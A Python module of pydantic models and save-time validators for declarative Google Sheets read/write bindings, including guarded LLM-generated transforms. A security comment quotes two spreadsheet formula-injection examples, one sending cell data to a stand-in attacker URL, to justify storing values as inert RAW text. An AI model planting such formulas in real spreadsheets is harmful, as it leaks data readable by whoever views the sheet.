"""Declarative bindings over a Google spreadsheet.

A *binding* is a description of what to read from (or write to) a spreadsheet,
authored in a form rather than written as code.  It carries no Python and no
natural language: every column it touches was picked from a dropdown filled
from the sheet's own header row, and every value it writes is tagged as either
a literal or a path into the workflow's state.  That is the whole point — a
binding is data, so it can be validated at save time and shown back to the
person who authored it, and there is nothing in it that could be ``eval``'d.

Bindings live on the ``google-sheets`` :class:`DataSourceDefinition` next to
its raw operations (``DataSourceDefinition.bindings``).  Saving one **compiles
it into a named ``OperationDefinition``** on the same source (see
``app.infrastructure.datasources.sheet_binding_compile``), which is what makes
it reachable from everywhere at once: a workflow ``data_source`` step, the
approval gate, ``POST /datasources/try-operation`` and the ``datasources`` MCP
tool surface all address operations by name, so none of them needed a new step
type or a new concept.

Semantics that carry the safety story
-------------------------------------
``write.columns`` is a **map**, and a column absent from it is never touched.
    A write names the columns it sets and nothing else, so a person editing the
    ``notes`` column of the same row while a workflow updates ``status`` does
    not lose their edit.  This is the single reason the write side is shaped as
    a map instead of a row of values.

``write.blank_policy`` is explicit, never inferred.
    ``skip`` leaves the cell exactly as it was when the resolved value is null
    or empty; ``clear`` writes an empty cell.  Both are defensible defaults for
    different sheets, which is precisely why the binding has to say which one
    it means.

Values are tagged: ``{"from": "<state path>"}`` or ``{"literal": <value>}``.
    A literal is *never* templated, so a literal containing ``{`` or ``}`` is
    safe — it reaches the cell as typed.  A ``from`` value names a state path
    and becomes a declared param of the compiled operation.

``document.sheet_id`` is authoritative; ``document.sheet`` (the tab title) is
for display.
    The numeric id survives a tab rename, the title does not.  A binding whose
    tab was renamed keeps working and the editor simply shows a stale name
    until the next probe.

``schema.fingerprint`` is a hash of the ordered header row.
    Captured when the binding is saved and re-checked immediately before every
    read and write.  A mismatch means somebody inserted, removed or reordered a
    column, so every column position the binding was authored against is
    suspect — and the run fails loudly rather than writing by position into
    whatever is there now.  Silently drifting writes that corrupt a column for
    months is the worst thing this design could do, so there is no fallback.
"""
from __future__ import annotations

import hashlib
import json
import re
from datetime import datetime
from typing import Any, Literal

from pydantic import BaseModel, ConfigDict, Field, model_serializer, model_validator

# Bump when a stored binding needs migrating.  Present from the first version
# so a stored document always says which shape it is, rather than the reader
# having to guess from which fields exist.
BINDING_VERSION = 1

# Mirrors ``sheet_compute.SIGNATURE_VERSION``.  Duplicated as a literal
# rather than imported because this module is the domain model and must not
# depend on the infrastructure package; the pair is asserted equal by a test,
# so they cannot drift silently.
COMPUTE_SIGNATURE_VERSION = 1

# A binding name becomes an operation name, so it has to survive both the
# template reference syntax (``{<operation>.<path>}`` — see
# ``data_source_definition.REF_PATTERN``) and MCP tool-name sanitisation
# (``ds_<source>_<operation>``).  Lower snake case is the intersection that
# needs no escaping anywhere and reads the same in every surface.
BINDING_NAME_RE = re.compile(r"^[a-z][a-z0-9_]{0,62}$")

# ``params`` is the reserved head of the reference syntax; an operation by that
# name would make ``{params.x}`` ambiguous.
RESERVED_BINDING_NAMES = frozenset({"params"})

FINGERPRINT_PREFIX = "sha256:"

# Head of a tagged value that refers to a tier-2 transform's output rather
# than to workflow state: ``{"from": "compute.total_hours"}``.  Kept distinct
# from a state path because the two resolve at different times and from
# different places -- a state path becomes a param of the compiled operation
# and is supplied by the caller, a compute path is filled in mid-run by the
# sandboxed transform and must never be demanded from the caller.
COMPUTE_PATH_PREFIX = "compute."


def header_fingerprint(headers: list[str]) -> str:
    """Hash the header row, order included.

    Order is part of the hash on purpose: a binding resolves a column to a
    position, so two sheets with the same header names in a different order are
    *not* interchangeable for it.
    """
    canonical = json.dumps(list(headers), ensure_ascii=False, separators=(",", ":"))
    digest = hashlib.sha256(canonical.encode("utf-8")).hexdigest()
    return f"{FINGERPRINT_PREFIX}{digest}"


# ---------------------------------------------------------------------------
# Tagged values
# ---------------------------------------------------------------------------

class TaggedValue(BaseModel):
    """Exactly one of ``{"literal": <value>}`` or ``{"from": "<state path>"}``.

    The tag is the reason this is a model and not a bare value.  Without it
    ``"state.project.id"`` is indistinguishable from the string a user actually
    wants in the cell, and the usual fix — templating, ``{{state.project.id}}``
    — makes every literal containing a brace a hazard.  Tagging instead means a
    literal is copied through untouched and a state path is resolved by name,
    with no parsing of user text in either direction.
    """

    # serialize_by_alias keeps ``from`` (a Python keyword, hence the rename) on
    # the wire, so what the editor posts is what comes back out.
    model_config = ConfigDict(populate_by_name=True, serialize_by_alias=True, extra="forbid")

    literal: Any = None
    state_path: str | None = Field(default=None, alias="from")

    @model_validator(mode="after")
    def _exactly_one_tag(self) -> "TaggedValue":
        has_path = bool(self.state_path)
        # ``literal`` defaults to None, so "was it given?" is the field-set
        # question, not a truthiness one: {"literal": null} is a legitimate
        # value (it is how a binding clears a cell under blank_policy=clear).
        has_literal = "literal" in self.model_fields_set
        if has_path and has_literal:
            raise ValueError(
                "a value carries either 'from' or 'literal', not both"
            )
        if not has_path and not has_literal:
            raise ValueError(
                "a value must be {\"literal\": <value>} or {\"from\": \"state.<path>\"}"
            )
        return self

    @model_serializer(mode="plain")
    def _serialize(self) -> dict[str, Any]:
        """Emit only the tag that is set, so a dump re-validates unchanged.

        Dumping both keys would round-trip into a value carrying ``literal:
        null`` *and* ``from``, which the validator above rightly refuses.
        """
        if self.state_path:
            return {"from": self.state_path}
        return {"literal": self.literal}

    @property
    def is_state_path(self) -> bool:
        return bool(self.state_path)


# ---------------------------------------------------------------------------
# Document + schema
# ---------------------------------------------------------------------------

class SheetDocument(BaseModel):
    """Which spreadsheet, and which tab of it, a binding is bound to."""

    model_config = ConfigDict(extra="forbid")

    provider: Literal["google_sheets"] = "google_sheets"
    # The /spreadsheets/d/<file_id>/ part of the document's URL.
    file_id: str
    # Display only, both of these: the file may be renamed at any time.
    name: str = ""
    # Tab title.  Used to build A1 ranges (the Sheets values API addresses tabs
    # by title, not by id) but never to *identify* the tab — see sheet_id.
    sheet: str = ""
    # Authoritative tab identity: it survives a rename, the title does not.  A
    # probe reconciles the two and hands the current title back to the editor.
    sheet_id: int | None = None


class SheetSchema(BaseModel):
    """The header row a binding was authored against."""

    model_config = ConfigDict(extra="forbid")

    # 1-based sheet row the headers live on.  Data starts on the next row.
    header_row: int = Field(default=1, ge=1)
    headers: list[str] = Field(default_factory=list)
    # ``sha256:…`` over the ordered headers; see header_fingerprint.
    fingerprint: str = ""
    probed_at: datetime | None = None

    def expected_fingerprint(self) -> str:
        """The fingerprint the stored headers hash to.

        Used to fill a binding whose caller supplied headers but no
        fingerprint, so an author cannot accidentally save a binding with no
        drift protection at all.
        """
        return header_fingerprint(self.headers)


# ---------------------------------------------------------------------------
# Read
# ---------------------------------------------------------------------------

FilterOperator = Literal["eq", "ne", "lt", "lte", "gt", "gte", "in", "contains"]

FILTER_OPERATORS: tuple[str, ...] = (
    "eq", "ne", "lt", "lte", "gt", "gte", "in", "contains",
)


class FilterClause(BaseModel):
    """One comparison against one column of a row."""

    model_config = ConfigDict(extra="forbid")

    column: str
    op: FilterOperator = "eq"
    value: TaggedValue


class FilterGroup(BaseModel):
    """``and`` / ``or`` over clauses, which may themselves be groups.

    Nesting is allowed even though the editor only builds one flat level: a
    stored binding is data, and refusing to *parse* what the model can express
    would mean two different notions of a valid filter.
    """

    model_config = ConfigDict(extra="forbid")

    op: Literal["and", "or"] = "and"
    clauses: list["FilterClause | FilterGroup"] = Field(default_factory=list)


class CellRange(BaseModel):
    """A cell range named either by A1 notation or by a named range."""

    model_config = ConfigDict(extra="forbid")

    named_range: str | None = None
    a1: str | None = None

    @model_validator(mode="after")
    def _exactly_one(self) -> "CellRange":
        if bool(self.named_range) == bool(self.a1):
            raise ValueError("a range carries either 'named_range' or 'a1', not both")
        return self

    def render(self) -> str:
        """The string the Sheets values API takes as its range."""
        return self.named_range or self.a1 or ""


class ReadSpec(BaseModel):
    """What a ``operation: "read"`` binding reads.

    ``rows``
        Every data row, optionally filtered, projected onto ``columns``.
        ``columns`` is required and starts empty in the editor: a sheet with
        forty columns and five hundred rows read whole is twenty thousand cells
        landing in whatever consumes the output, and for an LLM step that is the
        difference between a usable prompt and a truncated one.
    ``row_by_key``
        The first row whose ``key_column`` equals ``key_value``, projected onto
        ``columns``.  ``on_missing`` says whether "no such row" is a null result
        or an error.
    ``cells``
        One explicit range — a named range, or A1 notation — returned as-is.
    """

    model_config = ConfigDict(extra="forbid")

    mode: Literal["rows", "row_by_key", "cells"] = "rows"

    # rows / row_by_key: the projection.  Required for both; see the docstring.
    columns: list[str] = Field(default_factory=list)
    # rows only.
    filter: FilterGroup | None = None
    limit: int | None = Field(default=None, ge=1)
    # row_by_key only.
    key_column: str | None = None
    key_value: TaggedValue | None = None
    on_missing: Literal["null", "error"] = "null"
    # cells only.
    range: CellRange | None = None

    # How Sheets should render what it returns.  UNFORMATTED_VALUE is the
    # default because a binding feeds a program: "1,234.50 kr" is a string that
    # no downstream comparison can do arithmetic on, 1234.5 is a number.
    value_render: Literal["FORMATTED_VALUE", "UNFORMATTED_VALUE", "FORMULA"] = (
        "UNFORMATTED_VALUE"
    )
    date_render: Literal["SERIAL_NUMBER", "FORMATTED_STRING"] = "FORMATTED_STRING"


# ---------------------------------------------------------------------------
# Write
# ---------------------------------------------------------------------------

class CellWrite(BaseModel):
    """One range and the value to put in it (``set_cells`` mode)."""

    model_config = ConfigDict(extra="forbid")

    range: CellRange
    value: TaggedValue


class WriteSpec(BaseModel):
    """What a ``operation: "write"`` binding writes.

    ``update_by_key`` (default)
        Find the row whose ``key_column`` equals ``key_value`` and set the
        columns named in ``columns``.  ``on_missing`` decides what happens when
        there is no such row: ``error`` (the default — a write that silently
        did nothing is worse than a failed run), ``append`` (add it as a new
        row) or ``skip`` (report zero cells written).
    ``append_row``
        Always add a row, built from ``columns``.
    ``set_cells``
        Write explicit ranges from ``cells``, ignoring rows entirely.

    ``columns`` is a map and a column absent from it is never touched — the
    property that makes a workflow safe to run against a sheet humans are also
    editing.  ``blank_policy`` decides what a resolved null or empty string
    means: ``skip`` leaves the cell alone, ``clear`` writes an empty cell.
    """

    model_config = ConfigDict(extra="forbid")

    mode: Literal["update_by_key", "append_row", "set_cells"] = "update_by_key"

    key_column: str | None = None
    key_value: TaggedValue | None = None
    on_missing: Literal["error", "append", "skip"] = "error"

    # SECURITY: RAW, always, unless the author says otherwise in the form.
    #
    # USER_ENTERED makes Sheets parse the value the way typing it would, so a
    # value beginning with '=' becomes a *live formula*.  What a binding writes
    # comes from workflow state — a ticket body, a customer email, an LLM's
    # output — none of which is trusted text.  `=IMPORTRANGE("<attacker
    # sheet>", "A1")` or `=IMAGE("https://attacker/?d="&A1)` landing in a cell
    # then evaluates with the *viewing* user's permissions and exfiltrates
    # whatever that user can read, from a document the attacker never touched.
    # RAW stores the same string as inert text.
    value_input_option: Literal["RAW", "USER_ENTERED"] = "RAW"
    # Only meaningful with USER_ENTERED: opting out of the leading-'='
    # prefix guard, for a binding that genuinely writes formulas the author
    # composed.  Two separate switches on purpose — "I want Sheets to parse
    # dates and numbers" and "I want values from state to be able to become
    # formulas" are different decisions and one of them is dangerous.
    allow_formulas: bool = False

    blank_policy: Literal["skip", "clear"] = "skip"

    # column name -> value.  Absent column == untouched.
    columns: dict[str, TaggedValue] = Field(default_factory=dict)
    # set_cells only.
    cells: list[CellWrite] = Field(default_factory=list)


# ---------------------------------------------------------------------------
# Provenance + output
# ---------------------------------------------------------------------------

class ComputeSpec(BaseModel):
    """The generated transform of a tier-2 binding: values, never addresses.

    A tier-1 binding is a form and holds no code.  When the requested
    computation cannot be expressed as a form -- grouping, aggregation,
    arithmetic across rows -- the *computation half* is generated and stored
    here, and the *addressing half* stays exactly where it was: ``document``,
    ``sheet``, ``key_column`` and the ``columns`` whitelist are still declared
    by the binding, and tier-1's ``sheets_build_write`` is still the only thing
    that turns a column name into an A1 range.

    So this block cannot name a document, cannot compute a range, and cannot
    write to a column the binding does not declare -- the last of those is
    re-checked as a hard runtime error, not merely requested in the prompt.

    ``code`` is stored inline on the binding rather than in the script library.
    A library script is addressable and callable by any ``python`` workflow
    step, which would let a transform be invoked *outside* the sandwich that
    constrains it -- no column whitelist, no fingerprint check, no approval
    gate.  Inline, the only caller is the binding runtime.
    """

    model_config = ConfigDict(extra="forbid")

    # Content-derived id, ``sheets_tx_<8 hex>``.  Stable across a recompile that
    # produces byte-identical code, so the binding shows no spurious change.
    script_id: str = ""
    # ``sha256:…`` of ``code``.  Recorded per run, so a six-month-old run's log
    # line identifies the code that produced the values.
    content_hash: str = ""
    # Pinned so a future signature change invalidates stored scripts instead of
    # silently mis-calling them with arguments they never expected.
    signature_version: int = 1
    # ``def transform(records: list[dict], params: dict) -> Any``
    code: str = ""
    # What a read transform promises to return: a list of dicts, one dict, or a
    # scalar.  Declared rather than inferred from the first run, so a transform
    # that happens to return one row today does not quietly change the
    # binding's contract when the sheet grows.  Unused for writes, which always
    # return a column map.
    output_shape: Literal["records", "record", "value"] = "records"
    # A one-line "why" from the model, shown next to the code in review.
    rationale: str = ""

    # ── Lifecycle ────────────────────────────────────────────────────────────
    # A compiled transform is inert until somebody looks at its code and its
    # output on their own rows and says yes.  Escalating to generated code is
    # never silent, and neither is turning it on.
    activated: bool = False
    # Set when the schema fingerprint, the instruction or the answers moved on.
    # A stale *read* can be recompiled freely; a stale *write* must never
    # auto-recompile -- it is marked and waits for a person.
    stale: bool = False
    stale_reason: str = ""
    # Identity of the compile request that produced this code
    # (instruction + answers + fingerprint + model + signature version).
    # Any change to any of those is a different key, which is what makes
    # invalidation mechanical rather than a judgement call.
    cache_key: str = ""


class BindingOutput(BaseModel):
    """Where a read binding's result is published in workflow state."""

    model_config = ConfigDict(extra="forbid")

    key: str = ""


class GoldenFixture(BaseModel):
    """A frozen ``sample_rows -> output`` pair for a generated transform.

    The regression test a tier-2 binding carries with it.  "The model
    regenerated the code and it still parses" is not evidence that it still
    computes the same answer, so the answer itself is frozen: re-run on every
    recompile and whenever the header row changes, and a difference stops the
    binding rather than quietly changing what it writes.

    The rows are stored **inline** rather than behind a reference because there
    is no blob store to reference and a fixture is a handful of rows -- and
    because a fixture that lived somewhere else could go missing, which would
    silently turn the check off.  ``input_rows`` are the probe's real sample
    rows plus the synthetic adversarial ones (see
    ``sheet_compute.adversarial_rows``); the synthetic ones are the half that
    finds bugs.
    """

    model_config = ConfigDict(extra="forbid")

    # The grid the fixture was frozen over, header row excluded.
    input_rows: list[list[Any]] = Field(default_factory=list)
    # What the transform returned for those rows.
    output: Any = None
    # sha256 of each side, so a log line or a UI can show the fixture changed
    # without carrying the whole thing.
    input_hash: str = ""
    output_hash: str = ""
    # When the fixture last reproduced.  This is the "last verified <n>d ago"
    # the editor shows, and the reason it is a real timestamp and not a boolean:
    # a fixture that last passed six months ago is a different claim from one
    # that passed this morning.
    verified_at: datetime | None = None


class BindingResolution(BaseModel):
    """How this binding came to exist -- provenance, not behaviour.

    Nothing here changes what a binding does; it records who authored it and
    how.  Two tiers use the same shape:

    ``tier: "binding"`` with ``authored_by: "human"``
        A form-authored tier-1 binding.  ``instruction`` / ``model_id`` stay
        ``None``, and the save endpoints *force* them to -- a caller cannot
        fabricate LLM provenance by posting it.

    ``tier: "script"`` with ``authored_by: "llm"``
        A tier-2 binding whose computation was generated from ``instruction``
        by ``model_id``.  Only the compile path writes this, and it is the one
        path that may.
    """

    model_config = ConfigDict(extra="forbid")

    tier: Literal["binding", "script"] = "binding"
    # The natural-language request a tier-2 binding was generated from.
    #
    # SECURITY: untrusted user input, and it is fed back into a compile prompt
    # on every recompile.  It is carried as data and interpolated only into a
    # clearly delimited *user*-role section of the prompt, never into a system
    # prompt and never into anything that decides whether a gate runs.  See
    # ``sheet_compute_generate``.
    instruction: str | None = None
    # Answers to the ambiguity questions a compile asked, folded into every
    # later compile so a recompile is reproducible rather than a fresh guess.
    answers: dict[str, str] = Field(default_factory=dict)
    authored_by: Literal["human", "llm"] = "human"
    model_id: str | None = None
    compiled_at: datetime | None = None
    # Tier 2: the id of the generated transform (``sheets_tx_<hash>``).
    script_id: str | None = None
    # Set when a person edited a model's draft.  Once true the compile path
    # refuses to regenerate: overwriting somebody's fix with a fresh generation
    # is the single most annoying thing this feature could do.
    edited_by_human: bool = False
    golden: GoldenFixture | None = None


# ---------------------------------------------------------------------------
# The binding
# ---------------------------------------------------------------------------

class SheetBinding(BaseModel):
    """One named read or write against one tab of one spreadsheet."""

    model_config = ConfigDict(populate_by_name=True, serialize_by_alias=True, extra="forbid")

    version: int = BINDING_VERSION
    name: str
    document: SheetDocument
    # Named ``sheet_schema`` rather than ``schema`` because the latter shadows a
    # pydantic BaseModel attribute (same reason PubSubSpec has
    # ``event_schema``).  ``schema`` stays the wire name via the alias.
    sheet_schema: SheetSchema = Field(alias="schema")
    operation: Literal["read", "write"]
    read: ReadSpec | None = None
    write: WriteSpec | None = None
    output: BindingOutput = Field(default_factory=BindingOutput)
    # Tier 2 only.  Absent on a form-authored binding, and its absence is
    # what makes that binding demonstrably code-free.
    compute: ComputeSpec | None = None
    resolution: BindingResolution = Field(default_factory=BindingResolution)

    @model_validator(mode="after")
    def _one_spec_for_the_operation(self) -> "SheetBinding":
        if self.operation == "read":
            if self.read is None:
                raise ValueError("a read binding needs a 'read' block")
            if self.write is not None:
                raise ValueError("a read binding must not carry a 'write' block")
        else:
            if self.write is None:
                raise ValueError("a write binding needs a 'write' block")
            if self.read is not None:
                raise ValueError("a write binding must not carry a 'read' block")
        return self

    # ------------------------------------------------------------------
    # Derived views
    # ------------------------------------------------------------------

    def state_paths(self) -> list[str]:
        """Every ``{"from": …}`` path the binding references, in a stable order.

        This is what the compiled operation's params are built from, so the
        order has to be deterministic: a recompile that reshuffled the param
        list would show up as a spurious change on every save.
        """
        paths: list[str] = []

        def add(value: TaggedValue | None) -> None:
            if value is not None and value.state_path and value.state_path not in paths:
                paths.append(value.state_path)

        def walk_filter(group: FilterGroup) -> None:
            for clause in group.clauses:
                if isinstance(clause, FilterGroup):
                    walk_filter(clause)
                else:
                    add(clause.value)

        if self.read is not None:
            add(self.read.key_value)
            if self.read.filter is not None:
                walk_filter(self.read.filter)
        if self.write is not None:
            add(self.write.key_value)
            for column in sorted(self.write.columns):
                add(self.write.columns[column])
            for cell in self.write.cells:
                add(cell.value)
        # A compute path is not a param: it is filled in mid-run by the
        # transform, so demanding it from the caller would make a tier-2 write
        # uncallable.
        return [p for p in paths if not p.startswith(COMPUTE_PATH_PREFIX)]

    def compute_paths(self) -> list[str]:
        """Every ``{"from": "compute.<field>"}`` field the binding references.

        The fields a tier-2 transform is expected to produce, which is what the
        prompt is built from and what the output check is measured against.
        """
        fields: list[str] = []

        def add(value: TaggedValue | None) -> None:
            path = (value.state_path or "") if value is not None else ""
            if path.startswith(COMPUTE_PATH_PREFIX):
                field = path[len(COMPUTE_PATH_PREFIX):]
                if field and field not in fields:
                    fields.append(field)

        if self.write is not None:
            for column in sorted(self.write.columns):
                add(self.write.columns[column])
            for cell in self.write.cells:
                add(cell.value)
        return fields

    def referenced_columns(self) -> list[tuple[str, str]]:
        """``(where, column)`` for every column name the binding names.

        ``where`` is a human-readable location ("read.columns",
        "write.key_column") so a rejection can say which field held the unknown
        name instead of only that one existed.
        """
        found: list[tuple[str, str]] = []

        def walk_filter(group: FilterGroup, where: str) -> None:
            for index, clause in enumerate(group.clauses):
                if isinstance(clause, FilterGroup):
                    walk_filter(clause, f"{where}.clauses[{index}]")
                else:
                    found.append((f"{where}.clauses[{index}].column", clause.column))

        if self.read is not None:
            for column in self.read.columns:
                found.append(("read.columns", column))
            if self.read.key_column:
                found.append(("read.key_column", self.read.key_column))
            if self.read.filter is not None:
                walk_filter(self.read.filter, "read.filter")
        if self.write is not None:
            if self.write.key_column:
                found.append(("write.key_column", self.write.key_column))
            for column in self.write.columns:
                found.append(("write.columns", column))
        return found


# ``clauses`` is self-referential through the union above.
FilterGroup.model_rebuild()


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

class BindingValidationError(ValueError):
    """A binding that cannot be saved, with a message meant for its author."""


def validate_binding(binding: SheetBinding) -> None:
    """Raise :class:`BindingValidationError` when *binding* is not savable.

    Everything checkable without touching the network is checked here, at save
    time, because the alternative is finding out mid-run: an unknown column
    name is a typo the author can fix in the form, but the same typo reaching
    the runtime is a failed workflow (a read) or a write to the wrong column
    (which is why nothing downstream ever resolves a column by position alone).
    """
    if not BINDING_NAME_RE.match(binding.name or ""):
        raise BindingValidationError(
            f"'{binding.name}' is not a usable binding name: use lower snake "
            "case starting with a letter (a-z, 0-9, _), at most 63 characters — "
            "the name becomes an operation name and an MCP tool name."
        )
    if binding.name in RESERVED_BINDING_NAMES:
        raise BindingValidationError(
            f"'{binding.name}' is reserved and cannot be a binding name."
        )
    if not binding.document.file_id:
        raise BindingValidationError("document.file_id is required")
    if not binding.document.sheet:
        raise BindingValidationError(
            "document.sheet (the tab title) is required — it is how the Sheets "
            "values API addresses a tab"
        )

    headers = binding.sheet_schema.headers
    if not headers:
        raise BindingValidationError(
            "schema.headers is empty — probe the sheet before saving a binding, "
            "so every column name is one the sheet actually has"
        )
    duplicates = sorted({h for h in headers if headers.count(h) > 1 and h != ""})
    if duplicates:
        raise BindingValidationError(
            "the header row has duplicate column name(s): "
            f"{', '.join(duplicates)}. A binding resolves a column by name, so "
            "the names have to be unique — rename them in the sheet and probe again."
        )

    known = set(headers)
    for where, column in binding.referenced_columns():
        if column not in known:
            raise BindingValidationError(
                f"unknown column '{column}' in {where}: the sheet's header row "
                f"has {', '.join(repr(h) for h in headers)}"
            )

    _validate_compute(binding)

    if binding.operation == "read":
        _validate_read(binding.read, has_compute=binding.compute is not None)  # type: ignore[arg-type]
    else:
        _validate_write(binding.write, has_compute=binding.compute is not None)  # type: ignore[arg-type]


def _validate_read(read: ReadSpec, has_compute: bool = False) -> None:
    if read.mode in ("rows", "row_by_key"):
        # A tier-2 read may leave `columns` empty: its transform does the
        # projecting, and the shape check on the transform's *output* is
        # what keeps the result small.  Naming columns anyway still means
        # something and is stronger -- the records are projected onto them
        # BEFORE the transform runs, so a transform cannot read a column
        # the binding does not declare.
        if not read.columns and not has_compute:
            raise BindingValidationError(
                f"read.columns is required for mode '{read.mode}': pick the "
                "columns to return, so the whole sheet is not handed to "
                "whatever consumes this"
            )
        if read.range is not None:
            raise BindingValidationError(
                f"read.range only applies to mode 'cells', not '{read.mode}'"
            )
    if read.mode == "row_by_key":
        if not read.key_column:
            raise BindingValidationError("read.key_column is required for mode 'row_by_key'")
        if read.key_value is None:
            raise BindingValidationError("read.key_value is required for mode 'row_by_key'")
    else:
        if read.key_column or read.key_value is not None:
            raise BindingValidationError(
                f"read.key_column / read.key_value only apply to mode "
                f"'row_by_key', not '{read.mode}'"
            )
    if read.mode == "cells":
        if read.range is None:
            raise BindingValidationError("read.range is required for mode 'cells'")
        if read.columns:
            raise BindingValidationError(
                "read.columns does not apply to mode 'cells' — a cell range is "
                "returned as-is"
            )
        if read.filter is not None:
            raise BindingValidationError("read.filter does not apply to mode 'cells'")
    if read.mode != "rows" and read.filter is not None:
        raise BindingValidationError(f"read.filter only applies to mode 'rows', not '{read.mode}'")
    if read.filter is not None:
        _validate_filter(read.filter)


def _validate_filter(group: FilterGroup) -> None:
    if not group.clauses:
        raise BindingValidationError(
            "a filter group with no clauses matches nothing meaningful — remove "
            "the filter, or give it at least one clause"
        )
    for clause in group.clauses:
        if isinstance(clause, FilterGroup):
            _validate_filter(clause)
        elif clause.op == "in" and clause.value.state_path is None:
            if not isinstance(clause.value.literal, (list, tuple)):
                raise BindingValidationError(
                    f"filter on '{clause.column}' uses 'in', so its literal "
                    "value must be a list"
                )


def _validate_write(write: WriteSpec, has_compute: bool = False) -> None:
    if write.mode in ("update_by_key", "append_row"):
        if not write.columns:
            raise BindingValidationError(
                f"write.columns is required for mode '{write.mode}': name the "
                "columns to set. A column left out of the map is never touched, "
                "so an empty map writes nothing."
            )
        if write.cells:
            raise BindingValidationError(
                f"write.cells only applies to mode 'set_cells', not '{write.mode}'"
            )
    if write.mode == "update_by_key":
        if not write.key_column:
            raise BindingValidationError("write.key_column is required for mode 'update_by_key'")
        if write.key_value is None:
            raise BindingValidationError("write.key_value is required for mode 'update_by_key'")
        if write.on_missing == "append" and write.key_column not in write.columns:
            raise BindingValidationError(
                f"on_missing 'append' would add a row with no value in the key "
                f"column '{write.key_column}' — add it to write.columns, or use "
                "on_missing 'error'"
            )
    else:
        if write.key_column or write.key_value is not None:
            raise BindingValidationError(
                "write.key_column / write.key_value only apply to mode "
                f"'update_by_key', not '{write.mode}'"
            )
    if write.mode == "set_cells":
        if not write.cells:
            raise BindingValidationError("write.cells is required for mode 'set_cells'")
        if write.columns:
            raise BindingValidationError(
                "write.columns does not apply to mode 'set_cells' — name the "
                "ranges in write.cells instead"
            )
    if write.allow_formulas and write.value_input_option != "USER_ENTERED":
        raise BindingValidationError(
            "allow_formulas only means anything with value_input_option "
            "'USER_ENTERED' — with 'RAW' every value is stored as inert text"
        )


def _validate_compute(binding: SheetBinding) -> None:
    """The tier-1/tier-2 consistency rules.

    ``compute`` and ``resolution.tier`` have to agree, in both directions.  A
    binding carrying generated code while claiming ``tier: "binding"`` would
    render in the editor with the "deterministic, no code" badge, which is the
    one lie this feature cannot afford to tell; and ``tier: "script"`` with no
    code is a binding that compiles to an operation that cannot run.
    """
    compute = binding.compute
    tier = binding.resolution.tier

    if compute is None:
        if tier == "script":
            raise BindingValidationError(
                "resolution.tier is 'script' but the binding carries no "
                "'compute' block — a tier-2 binding is its generated transform"
            )
        stray = binding.compute_paths()
        if stray:
            raise BindingValidationError(
                f"this binding references compute field(s) "
                f"{', '.join(repr(s) for s in stray)} but has no 'compute' "
                "block, so nothing would ever produce them"
            )
        return

    if tier != "script":
        raise BindingValidationError(
            "a binding with a 'compute' block is tier 2, so resolution.tier "
            f"must be 'script', not {tier!r}"
        )
    if not (compute.code or "").strip():
        raise BindingValidationError("compute.code is empty")
    if compute.signature_version != COMPUTE_SIGNATURE_VERSION:
        raise BindingValidationError(
            f"compute.signature_version is {compute.signature_version}, but "
            f"this backend calls transforms with signature version "
            f"{COMPUTE_SIGNATURE_VERSION}. Recompile the binding — calling a "
            "script written against another signature would mis-pass its "
            "arguments rather than fail."
        )
    if not compute.content_hash:
        raise BindingValidationError(
            "compute.content_hash is required — it is what a run records to "
            "identify the code that produced its values"
        )

    if binding.operation == "write":
        write = binding.write
        assert write is not None
        if write.mode == "set_cells":
            raise BindingValidationError(
                "a generated transform returns column values, and 'set_cells' "
                "addresses ranges directly — the two do not combine. Use "
                "'update_by_key' or 'append_row', where the binding's column "
                "map is the whitelist the transform is held to."
            )
        if not write.columns:
            raise BindingValidationError(
                "a tier-2 write needs write.columns: it is the whitelist the "
                "generated transform is checked against at run time, and "
                "without it the transform would have nowhere to write"
            )
        unknown = [f for f in binding.compute_paths() if f not in write.columns]
        if unknown:
            raise BindingValidationError(
                f"compute field(s) {', '.join(repr(u) for u in unknown)} are "
                "referenced but are not columns of this write. A transform "
                "produces one value per declared column, so the field names "
                f"are the column names: {', '.join(sorted(write.columns))}"
            )


def validate_bindings(bindings: list[SheetBinding]) -> None:
    """Validate a whole list, including uniqueness of the names."""
    names = [b.name for b in bindings]
    duplicates = sorted({n for n in names if names.count(n) > 1})
    if duplicates:
        raise BindingValidationError(
            f"duplicate binding name(s): {', '.join(duplicates)}"
        )
    for binding in bindings:
        validate_binding(binding)
